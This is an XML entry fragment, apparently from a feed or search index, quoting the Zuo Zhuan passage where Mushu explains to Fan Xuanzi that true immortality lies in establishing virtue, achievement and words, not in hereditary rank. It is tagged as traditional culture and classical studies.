    <content type="text"><![CDATA[来源：《左传》二十四年春，穆叔如晋。范宣子逆之，问焉，曰：“古人有言曰：‘死而不朽’，何谓也？”穆叔未对。宣子曰：“昔匄之祖，自虞以上为陶唐氏，在夏为御龙氏，在商为豕韦氏，在周为唐杜氏，晋主夏盟为范氏，其是之谓乎？”穆叔曰：“以豹所闻，此之谓世禄，非不朽也。鲁有先大夫曰臧文仲，既没，其言立，其是之谓乎！豹闻之，‘太上有立德，其次有立功，其次有立言’，虽久不废，此之谓不朽。若夫保姓受氏，以守宗祊，世不绝祀，无国无之，禄之大者，不可谓不朽。]]></content>
      <tags>
        <tag>传统文化</tag>
        <tag>国学</tag>
      </tags>
  </entry>
</search>
